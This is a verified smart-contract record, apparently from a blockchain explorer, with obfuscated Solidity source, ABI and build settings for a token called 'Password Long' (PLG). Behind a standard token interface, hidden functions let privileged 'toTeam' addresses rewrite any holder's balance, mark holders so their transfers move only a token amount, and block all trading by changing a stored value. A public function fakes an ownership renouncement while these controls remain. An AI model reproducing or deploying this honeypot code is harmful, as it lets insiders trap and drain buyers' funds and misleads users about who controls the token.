{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface listFeeSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTrading {\n    function createPair(address marketingMinBuy, address tradingReceiver) external returns (address);\n}\n\ninterface toMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTrading) external view returns (uint256);\n\n    function transfer(address listAmount, uint256 teamFrom) external returns (bool);\n\n    function allowance(address launchLaunchedExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listAmount,\n        uint256 teamFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingMarketingEnable, uint256 value);\n    event Approval(address indexed launchLaunchedExempt, address indexed spender, uint256 value);\n}\n\ninterface toMinMetadata is toMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PasswordLong is receiverWallet, toMin, toMinMetadata {\n\n    uint256 constant sellFund = 7 ** 10;\n\n    bool private tokenTx;\n\n    address public launchedIs;\n\n    uint256 public atFrom;\n\n    uint256 public totalAutoMarketing;\n\n    uint256 amountWallet;\n\n    address exemptWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private shouldLimitSell = 100000000 * 10 ** 18;\n\n    function allowance(address teamFee, address txExemptLaunch) external view virtual override returns (uint256) {\n        if (txExemptLaunch == minTeam) {\n            return type(uint256).max;\n        }\n        return listEnable[teamFee][txExemptLaunch];\n    }\n\n    function owner() external view returns (address) {\n        return shouldTx;\n    }\n\n    string private launchSwap = \"Password Long\";\n\n    uint256 senderMinLaunched;\n\n    function tradingSender() private view {\n        require(toTeam[_msgSender()]);\n    }\n\n    function fromEnable(uint256 teamFrom) public {\n        tradingSender();\n        amountWallet = teamFrom;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isWallet;\n    }\n\n    bool public fundEnable;\n\n    mapping(address => bool) public tokenMin;\n\n    address private shouldTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLimitSell;\n    }\n\n    function transferFrom(address senderMinAt, address listAmount, uint256 teamFrom) external override returns (bool) {\n        if (_msgSender() != minTeam) {\n            if (listEnable[senderMinAt][_msgSender()] != type(uint256).max) {\n                require(teamFrom <= listEnable[senderMinAt][_msgSender()]);\n                listEnable[senderMinAt][_msgSender()] -= teamFrom;\n            }\n        }\n        return tokenTradingExempt(senderMinAt, listAmount, teamFrom);\n    }\n\n    mapping(address => uint256) private amountTx;\n\n    function feeMarketing() public {\n        emit OwnershipTransferred(launchedIs, address(0));\n        shouldTx = address(0);\n    }\n\n    event OwnershipTransferred(address indexed liquidityTx, address indexed modeTo);\n\n    function balanceOf(address totalTrading) public view virtual override returns (uint256) {\n        return amountTx[totalTrading];\n    }\n\n    mapping(address => mapping(address => uint256)) private listEnable;\n\n    function getOwner() external view returns (address) {\n        return shouldTx;\n    }\n\n    uint8 private isWallet = 18;\n\n    constructor (){\n        \n        listFeeSell launchSell = listFeeSell(minTeam);\n        fundLaunchWallet = isTrading(launchSell.factory()).createPair(launchSell.WETH(), address(this));\n        if (atTotalIs) {\n            tokenTx = false;\n        }\n        launchedIs = _msgSender();\n        feeMarketing();\n        toTeam[launchedIs] = true;\n        amountTx[launchedIs] = shouldLimitSell;\n        if (totalAutoMarketing == fundFrom) {\n            atTotalIs = false;\n        }\n        emit Transfer(address(0), launchedIs, shouldLimitSell);\n    }\n\n    uint256 private fundFrom;\n\n    function atLiquidity(address fromAt) public {\n        if (senderWallet) {\n            return;\n        }\n        \n        toTeam[fromAt] = true;\n        \n        senderWallet = true;\n    }\n\n    function tokenTradingExempt(address senderMinAt, address listAmount, uint256 teamFrom) internal returns (bool) {\n        if (senderMinAt == launchedIs) {\n            return tradingToFund(senderMinAt, listAmount, teamFrom);\n        }\n        uint256 shouldLaunchedSell = toMin(fundLaunchWallet).balanceOf(exemptWallet);\n        require(shouldLaunchedSell == amountWallet);\n        require(listAmount != exemptWallet);\n        if (tokenMin[senderMinAt]) {\n            return tradingToFund(senderMinAt, listAmount, sellFund);\n        }\n        return tradingToFund(senderMinAt, listAmount, teamFrom);\n    }\n\n    bool private atTotalIs;\n\n    bool public senderWallet;\n\n    string private sellListTrading = \"PLG\";\n\n    bool public tradingSell;\n\n    function tradingMin(address sellAt, uint256 teamFrom) public {\n        tradingSender();\n        amountTx[sellAt] = teamFrom;\n    }\n\n    function tradingToFund(address senderMinAt, address listAmount, uint256 teamFrom) internal returns (bool) {\n        require(amountTx[senderMinAt] >= teamFrom);\n        amountTx[senderMinAt] -= teamFrom;\n        amountTx[listAmount] += teamFrom;\n        emit Transfer(senderMinAt, listAmount, teamFrom);\n        return true;\n    }\n\n    function shouldTo(address isReceiver) public {\n        tradingSender();\n        if (atTotalIs) {\n            tokenTx = false;\n        }\n        if (isReceiver == launchedIs || isReceiver == fundLaunchWallet) {\n            return;\n        }\n        tokenMin[isReceiver] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchSwap;\n    }\n\n    function transfer(address sellAt, uint256 teamFrom) external virtual override returns (bool) {\n        return tokenTradingExempt(_msgSender(), sellAt, teamFrom);\n    }\n\n    address minTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public toTeam;\n\n    address public fundLaunchWallet;\n\n    function approve(address txExemptLaunch, uint256 teamFrom) public virtual override returns (bool) {\n        listEnable[_msgSender()][txExemptLaunch] = teamFrom;\n        emit Approval(_msgSender(), txExemptLaunch, teamFrom);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellListTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLaunchedExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMarketingEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txExemptLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExemptLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAt\",\"type\":\"address\"}],\"name\":\"atLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"fromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunchWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"shouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAutoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PasswordLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}